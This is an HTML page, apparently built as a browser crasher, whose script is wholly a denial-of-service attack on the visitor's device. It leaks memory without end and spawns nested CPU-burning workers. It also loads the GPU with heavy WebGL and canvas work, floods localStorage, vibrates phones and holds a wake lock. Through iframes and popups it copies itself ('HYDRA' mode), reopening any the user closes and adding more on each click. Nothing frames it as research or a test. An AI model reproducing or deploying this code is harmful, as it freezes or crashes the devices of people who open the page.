<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title></title>
  <style>
    *{margin:0;padding:0}
    html,body{width:100%;height:100%;overflow:hidden;background:#000;touch-action:none}
    #nest{position:fixed;inset:0;display:grid;grid-template-columns:repeat(5,1fr);grid-template-rows:repeat(4,1fr);opacity:.35}
    #nest iframe{width:100%;height:100%;border:0;background:#000}
    #stage{position:fixed;inset:-10%;width:120%;height:120%;pointer-events:none;filter:contrast(2) saturate(4)}
    canvas{position:absolute;inset:0;width:100%;height:100%;mix-blend-mode:screen}
    .blob{position:absolute;width:55vw;height:55vh;border-radius:40%;
      background:radial-gradient(circle,#ff0,#f0f,#0ff,transparent 70%);
      filter:blur(45px) contrast(4);animation:s .15s linear infinite;mix-blend-mode:color-dodge}
    @keyframes s{to{transform:rotate(360deg) scale(1.6)}}
    body.slave #nest{display:none}
  </style>
</head>
<body>
  <div id="nest"></div>
  <div id="stage"></div>
  <script>
  (() => {
    const q = new URLSearchParams(location.search);
    const SLAVE = q.get('slave') === '1';
    const MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
    const cores = navigator.hardwareConcurrency || 8;
    if (SLAVE) document.body.classList.add('slave');

    const stage = document.getElementById('stage');
    const nest = document.getElementById('nest');
    const hold = [];
    const workers = [];

    try { navigator.wakeLock?.request('screen').catch(() => {}); } catch (_) {}
    if (MOBILE) setInterval(() => { try { navigator.vibrate?.([30, 20, 50]); } catch (_) {} }, 200);

    function touch(u8) {
      for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
    }

    function eat(mb) {
      const size = mb || (MOBILE ? 48 : 96);
      try {
        const a = new Uint8Array(size * 1024 * 1024);
        touch(a);
        hold.push(a, new Float64Array(size * 96 * 1024), new ArrayBuffer(size * 256 * 1024));
      } catch (_) {
        try {
          const a = new Uint8Array(8 * 1024 * 1024);
          touch(a);
          hold.push(a);
        } catch (__) {}
      }
    }

    // CPU worker lebih berat
    const cpuCode = `
      const N = 1024 * 768;
      const a = new Float64Array(N), b = new Float64Array(N), c = new Float64Array(N);
      let n = Math.random();
      function burn() {
        for (let i = 0; i < N; i++) {
          n = Math.sin(n + a[i]) * Math.cos(b[i] * 1.13) + Math.sqrt(Math.abs(c[i] * n) + 1e-9);
          a[i] = n * b[i]; b[i] = Math.atan2(a[i], n + 0.001); c[i] = Math.hypot(a[i], b[i]);
        }
        var s = '';
        for (var i = 0; i < 400; i++) s += (n + i).toString(36);
        try { JSON.parse(JSON.stringify({ n: n, s: s.slice(0, 2000) })); } catch (e) {}
        postMessage(1);
        setTimeout(burn, 0);
        Promise.resolve().then(burn);
      }
      burn();
      setInterval(function(){ var x=1; for (var i=0;i<1e7;i++) x=Math.sin(x)*Math.cos(x+i); }, 1);
      try {
        var nested = URL.createObjectURL(new Blob([
          'setInterval(function(){var x=1;for(var i=0;i<3e6;i++)x=Math.sin(x);},1);' +
          'var h=[];setInterval(function(){try{var u=new Uint8Array(16*1024*1024);for(var i=0;i<u.length;i+=4096)u[i]=1;h.push(u);}catch(e){}},8);'
        ], { type: 'application/javascript' }));
        new Worker(nested);
      } catch (e) {}
    `;

    const ramCode = `
      var hold = [];
      var mb = ${MOBILE ? 48 : 96};
      function alloc() {
        try {
          var u8 = new Uint8Array(mb * 1024 * 1024);
          for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8, new Float64Array(mb * 48 * 1024), new ArrayBuffer(mb * 512 * 1024));
          postMessage(hold.length);
        } catch (e) {
          try {
            var u8 = new Uint8Array(8 * 1024 * 1024);
            for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
            hold.push(u8); postMessage(hold.length);
          } catch (e2) {}
        }
        setTimeout(alloc, 2);
      }
      alloc();
      setInterval(alloc, 5);
    `;

    // OffscreenCanvas worker
    const offCode = (typeof OffscreenCanvas !== 'undefined') ? `
      var c = new OffscreenCanvas(${MOBILE ? 1280 : 1920}, ${MOBILE ? 720 : 1080});
      var ctx = c.getContext('2d');
      var img = ctx.createImageData(${MOBILE ? 640 : 960}, ${MOBILE ? 360 : 540});
      var hold = [];
      function go() {
        var d = img.data, t = performance.now() * 0.02;
        for (var i = 0; i < d.length; i += 4) {
          d[i] = (Math.sin(i * 0.01 + t) * 127 + 128) | 0;
          d[i+1] = (Math.cos(i * 0.013 - t) * 127 + 128) | 0;
          d[i+2] = (Math.sin(i * 0.007 + t * 2) * 127 + 128) | 0;
          d[i+3] = 255;
        }
        ctx.putImageData(img, 0, 0);
        ctx.filter = 'blur(8px) contrast(300%)';
        ctx.globalCompositeOperation = 'lighter';
        ctx.drawImage(c, -15, -15, c.width + 30, c.height + 30);
        try {
          var u8 = new Uint8Array(8 * 1024 * 1024);
          for (var i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8);
        } catch (e) {}
        requestAnimationFrame(go);
      }
      go();
      setInterval(function(){ var x=1; for (var i=0;i<4e6;i++) x=Math.sin(x); }, 1);
    ` : null;

    function mkWorker(code) {
      const url = URL.createObjectURL(new Blob([code], { type: 'application/javascript' }));
      const w = new Worker(url);
      workers.push(w);
      return w;
    }

    function spawnCPU(n) { for (let i = 0; i < n; i++) { try { mkWorker(cpuCode); } catch (_) {} } }
    function spawnRAM(n) { for (let i = 0; i < n; i++) { try { mkWorker(ramCode); } catch (_) {} } }
    function spawnOff(n) {
      if (!offCode) return;
      for (let i = 0; i < n; i++) { try { mkWorker(offCode); } catch (_) {} }
    }

    // BURST langsung
    for (let i = 0; i < (SLAVE ? (MOBILE ? 28 : 36) : (MOBILE ? 14 : 18)); i++) eat();

    if (SLAVE) {
      spawnCPU(Math.max(36, cores * 7));
      spawnRAM(Math.max(14, cores * 2));
      spawnOff(Math.max(6, cores));
    } else {
      spawnCPU(Math.max(24, cores * 5));
      spawnRAM(Math.max(10, cores + 2));
      spawnOff(Math.max(4, Math.ceil(cores / 2)));
    }

    // Spam worker terus
    setInterval(() => {
      try { mkWorker(cpuCode); } catch (_) {}
      try { mkWorker(ramCode); } catch (_) {}
      if (offCode) try { mkWorker(offCode); } catch (_) {}
      eat();
      eat(MOBILE ? 24 : 48);
    }, SLAVE ? 35 : 55);

    // WASM
    try {
      const mem = new WebAssembly.Memory({ initial: 512, maximum: 65536 });
      hold.push(mem);
      setInterval(() => {
        try { mem.grow(MOBILE ? 128 : 256); touch(new Uint8Array(mem.buffer)); } catch (_) {}
      }, 10);
    } catch (_) {}

    // Crypto storm (async, tidak freeze)
    if (crypto?.subtle) {
      const buf = new Uint8Array(512 * 1024).fill(7);
      const loop = () => {
        crypto.subtle.digest('SHA-512', buf)
          .then(() => crypto.subtle.digest('SHA-256', buf))
          .then(loop)
          .catch(() => setTimeout(loop, 0));
      };
      for (let i = 0; i < 4; i++) loop();
    }

    // MessageChannel flood ringan
    for (let i = 0; i < 16; i++) {
      const ch = new MessageChannel();
      const ping = () => ch.port1.postMessage(1);
      ch.port2.onmessage = () => { ping(); };
      ch.port1.onmessage = () => ch.port2.postMessage(1);
      ping();
    }

    // Canvas / blobs / WebGL
    const canvases = [], ctxs = [];
    const nCanvas = SLAVE ? (MOBILE ? 8 : 12) : (MOBILE ? 4 : 6);
    for (let i = 0; i < nCanvas; i++) {
      const c = document.createElement('canvas');
      c.width = MOBILE ? 960 : 1440;
      c.height = MOBILE ? 540 : 810;
      stage.appendChild(c);
      canvases.push(c);
      ctxs.push(c.getContext('2d'));
    }
    for (let i = 0; i < (SLAVE ? 36 : 18); i++) {
      const el = document.createElement('div');
      el.className = 'blob';
      el.style.left = (Math.random() * 90) + '%';
      el.style.top = (Math.random() * 90) + '%';
      stage.appendChild(el);
    }

    const glObjs = [];
    for (let g = 0; g < (SLAVE ? 3 : 2); g++) {
      try {
        const c = document.createElement('canvas');
        c.width = MOBILE ? 1280 : 1920;
        c.height = MOBILE ? 720 : 1080;
        stage.appendChild(c);
        const gl = c.getContext('webgl', { powerPreference: 'high-performance', antialias: true });
        if (!gl) continue;
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
        gl.compileShader(vs);
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        const iters = SLAVE ? 56 : 40;
        gl.shaderSource(fs, `
          precision mediump float; varying vec2 v; uniform float t;
          void main(){
            vec2 p=v*50.; float n=0.;
            for(int i=0;i<${iters};i++){
              float fi=float(i);
              n+=sin(p.x*fi*.11+t)*cos(p.y*fi*.14-t);
              float c=cos(t*.2),s=sin(t*.2);
              p=mat2(c,-s,s,c)*p*1.06;
            }
            gl_FragColor=vec4(.5+.5*sin(n+t),.5+.5*cos(n*1.7),.5+.5*sin(n*2.4-t),1.);
          }`);
        gl.compileShader(fs);
        const prog = gl.createProgram();
        gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
        gl.useProgram(prog);
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
        const loc = gl.getAttribLocation(prog, 'a');
        gl.enableVertexAttribArray(loc);
        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
        glObjs.push({ gl, prog, c });
      } catch (_) {}
    }

    let frames = 0;
    function tick(t) {
      frames++;
      // main ringan — jangan bikin Chrome pause
      let x = Math.random();
      const end = performance.now() + (SLAVE ? 5 : 3);
      while (performance.now() < end) x = Math.sin(x) * Math.cos(x);
      for (let i = 0; i < ctxs.length; i++) {
        const ctx = ctxs[i], c = canvases[i];
        if (!ctx) continue;
        ctx.globalAlpha = 0.2;
        ctx.fillStyle = 'rgb(' + ((t + i * 50) % 255 | 0) + ',' + ((t * 0.6) % 255 | 0) + ',90)';
        ctx.fillRect(Math.random() * c.width, Math.random() * c.height, 240, 240);
        ctx.filter = 'blur(4px) contrast(200%)';
        ctx.globalCompositeOperation = 'lighter';
        ctx.drawImage(c, -12, -12, c.width + 24, c.height + 24);
      }
      for (const g of glObjs) {
        g.gl.useProgram(g.prog);
        g.gl.uniform1f(g.gl.getUniformLocation(g.prog, 't'), t * 0.001);
        for (let i = 0; i < 8; i++) g.gl.drawArrays(g.gl.TRIANGLE_STRIP, 0, 4);
      }
      if (frames % 3 === 0) eat(MOBILE ? 24 : 48);
      stage.style.filter = 'contrast(' + (2 + Math.random()) + ') saturate(' + (3 + Math.random() * 3) + ') hue-rotate(' + (frames % 360) + 'deg)';
      requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);

    // Audio
    try {
      const ac = new (window.AudioContext || window.webkitAudioContext)();
      for (let i = 0; i < (SLAVE ? 64 : 40); i++) {
        const o = ac.createOscillator(), g = ac.createGain(), f = ac.createBiquadFilter(), d = ac.createDelay(0.5);
        f.type = 'bandpass'; f.frequency.value = 80 + i * 70; f.Q.value = 28;
        d.delayTime.value = 0.01 + (i % 20) * 0.01;
        g.gain.value = 0.00025;
        o.type = ['sawtooth', 'square', 'triangle'][i % 3];
        o.frequency.value = 30 + i * 28;
        o.connect(f); f.connect(d); d.connect(g); g.connect(ac.destination);
        o.start();
      }
      const arm = () => ac.resume().catch(() => {});
      document.addEventListener('click', arm);
      document.addEventListener('touchstart', arm, { passive: true });
      ac.resume().catch(() => {});
    } catch (_) {}

    // Storage storm async
    setInterval(() => {
      try {
        for (let i = 0; i < 50; i++) localStorage.setItem('z' + i + Date.now(), 'X'.repeat(20000));
      } catch (_) {}
    }, 2000);

    // HYDRA
    if (!SLAVE) {
      const slaveHref = (() => {
        const u = new URL(location.href);
        u.searchParams.set('slave', '1');
        return u.href;
      })();
      const iframes = [];
      const pops = [];

      function addIframe() {
        const f = document.createElement('iframe');
        f.src = slaveHref + '&t=' + Date.now() + '_' + Math.random();
        nest.appendChild(f);
        iframes.push(f);
        return f;
      }
      function addPopup() {
        try {
          const w = window.open(
            slaveHref + '&t=' + Date.now() + '_' + Math.random(),
            's' + Date.now() + Math.random().toString(36).slice(2),
            'width=280,height=180,left=' + ((pops.length * 36) % 700) + ',top=' + ((pops.length * 28) % 400)
          );
          if (w) pops.push(w);
          return w;
        } catch (_) { return null; }
      }

      const target = MOBILE ? 16 : 20;
      let made = 0;
      const timer = setInterval(() => {
        if (made >= target) { clearInterval(timer); return; }
        addIframe();
        made++;
      }, 70);

      if (!MOBILE) {
        setTimeout(() => { for (let i = 0; i < 8; i++) addPopup(); }, 400);
      }

      setTimeout(() => {
        for (let i = 0; i < (MOBILE ? 4 : 6); i++) addIframe();
        if (!MOBILE) for (let i = 0; i < 4; i++) addPopup();
      }, 2000);

      setInterval(() => {
        for (let i = 0; i < iframes.length; i++) {
          let dead = false;
          try {
            if (!iframes[i].contentWindow) dead = true;
            else void iframes[i].contentDocument;
          } catch (_) { dead = true; }
          if (dead) {
            try { iframes[i].remove(); } catch (_) {}
            iframes[i] = addIframe();
          }
        }
        for (let i = 0; i < pops.length; i++) {
          if (!pops[i] || pops[i].closed) pops[i] = addPopup();
        }
        if (iframes.length < (MOBILE ? 20 : 28)) addIframe();
        eat();
      }, 500);

      const arm = () => {
        for (let i = 0; i < 4; i++) addIframe();
        if (!MOBILE) for (let i = 0; i < 3; i++) addPopup();
        for (let i = 0; i < 6; i++) eat();
        spawnCPU(4); spawnRAM(2); spawnOff(1);
      };
      document.addEventListener('click', arm);
      document.addEventListener('touchstart', arm, { passive: true });
    }
  })();
  </script>
</body>
</html>
